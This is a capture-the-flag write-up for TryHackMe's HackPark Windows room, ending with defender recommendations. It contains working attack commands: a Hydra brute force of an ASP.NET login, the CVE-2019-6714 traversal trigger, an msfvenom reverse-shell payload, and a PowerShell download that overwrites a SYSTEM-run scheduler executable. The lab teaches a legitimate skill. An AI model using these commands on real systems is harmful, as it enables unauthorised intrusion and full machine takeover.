---
title: "HackPark"
date: 2026-03-07
platform: TryHackMe
difficulty: Medium
category: offensive
summary: "Hydra brute force against BlogEngine.NET, RCE via CVE-2019-6714, then SYSTEM via a scheduled-task hijack on a world-writable scheduler directory. Done twice: with Metasploit and fully manually."
---

## Overview

HackPark is a medium-difficulty Windows TryHackMe room that chains three real-world attack patterns: **VIEWSTATE-aware Hydra brute force** against an ASP.NET app, **a known-CVE RCE** in a popular .NET blog platform, and a **scheduled-task hijack** privesc that works because a third-party scheduler stored its executable in a world-writable directory.

The room is structured to be solved twice: once with Metasploit (the easy way) and once manually (the way that actually teaches you what the tools are doing).

## Tools Used

- **nmap** for the port scan.
- **hydra** with custom HTTP-form-aware flags for the brute force.
- **BlogEngine.NET CVE-2019-6714 exploit** (publicly available .NET payload).
- **Metasploit** for the first pass.
- **msfvenom** for generating the SYSTEM payload.
- **PowerShell Invoke-WebRequest** to pull the payload to the target.
- **netcat** for the manual reverse shell handler.

## Methodology

**Step 1 - Service enumeration.** A standard nmap scan returns IIS on port 80 with BlogEngine.NET running. The login page is at /Account/Login.aspx.

```bash
nmap -p- -sV <TARGET_IP>
```

**Step 2 - Hydra against an ASP.NET form.** ASP.NET forms include a hidden *__VIEWSTATE* field (a serialized blob of form state) and an *__EVENTVALIDATION* token. A naive Hydra invocation that ignores these fields will not authenticate even with the right credentials, because ASP.NET rejects the submission for a bad VIEWSTATE.

The fix is to grab fresh tokens with each request, which Hydra can be told to do.

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> \
  http-post-form "/Account/Login.aspx:__VIEWSTATE=^VIEWSTATE^&__EVENTVALIDATION=^EVENTVALIDATION^&ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^&ctl00$MainContent$LoginUser$LoginButton=Log+in:F=Login failed"
```

The failure marker *"Login failed"* tells Hydra a guess failed.

**Step 3 - RCE via CVE-2019-6714.** BlogEngine.NET 3.3.6 has an authenticated file upload vulnerability that becomes RCE because the *PostView.ascx* user control is rendered server-side. An authenticated user uploads a malicious *.ascx* file disguised as a theme/post resource, then triggers it by visiting the page with a crafted *theme* parameter that causes the server to render the attacker's file.

```
?theme=../../App_Data/files/PostView.ascx&a=
```

The `..` path traversal points the theme parameter at the uploaded file. The server reads it as a theme template and runs the embedded C# code.

**Step 4 - Reverse shell payload.** The uploaded .ascx file contains a small C# snippet that runs a Windows reverse shell via *cmd.exe* and *powershell.exe*.

```bash
# attacker:
nc -lvnp 4444
```

The callback lands as the IIS application pool user (limited).

**Step 5 - Privesc enumeration.** Running `whoami /priv` and walking through *winPEAS* or *PowerUp.ps1* surfaces an interesting third-party scheduler: **WScheduler.exe** is launching **Message.exe** from `C:\Program Files (x86)\SystemScheduler`. The kicker: that directory is *world-writable*.

```powershell
icacls "C:\Program Files (x86)\SystemScheduler"
```

The output shows *Everyone:(M)* or similar, meaning any user can write Message.exe. Since WScheduler runs as SYSTEM, replacing Message.exe gives SYSTEM execution on the next scheduled tick.

**Step 6 - Replace and wait.** Generate a SYSTEM-friendly payload with msfvenom, host it on a Python HTTP server, pull it to the target with PowerShell, and write it over the legitimate Message.exe.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=6666 -f exe -o Message.exe
```

```powershell
powershell -c "Invoke-WebRequest http://<KALI_IP>:8000/Message.exe -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
```

When the scheduler fires next, the payload runs as SYSTEM and a Meterpreter callback lands. Both user.txt and root.txt are then readable.

## Key Takeaways

- **ASP.NET brute force requires VIEWSTATE awareness.** Hydra's stock invocation will fail silently. Always inspect the form and capture every hidden field.
- **BlogEngine.NET CVE-2019-6714 is a textbook authenticated-RCE via path traversal in the theme parameter.** The lesson generalizes: any *theme*, *template*, or *include* parameter that accepts a path is a code execution surface.
- **World-writable program directories are a privesc primitive.** Third-party software installers (especially older ones from before 2010) frequently leave their install directories writable to all users.
- **The Metasploit shortcut hides what's actually happening.** Doing the manual path the second time teaches you why each piece works.

## What a Defender Should Do

- Patch BlogEngine.NET to the current version, or move off it entirely (the project is sparsely maintained). CVE-2019-6714 is from 2019 and a working public exploit exists.
- Audit ACLs on every `C:\Program Files` directory regularly. Anything writable by non-admin users is a privesc waiting to happen. *icacls* against every Program Files directory is a one-line check.
- Run service accounts with the minimum privilege they actually need. WScheduler did not need SYSTEM; a dedicated service account would have meant *"compromise the scheduler"* equals *"that one account"*, not *"the whole box."*
- Set strong password policies and rate-limit the login endpoint at the WAF or app layer. Hydra is only effective when the target accepts unlimited attempts.
- Monitor for new executables in service directories. Sysmon EventID 11 (FileCreate) on `C:\Program Files` is high-signal.
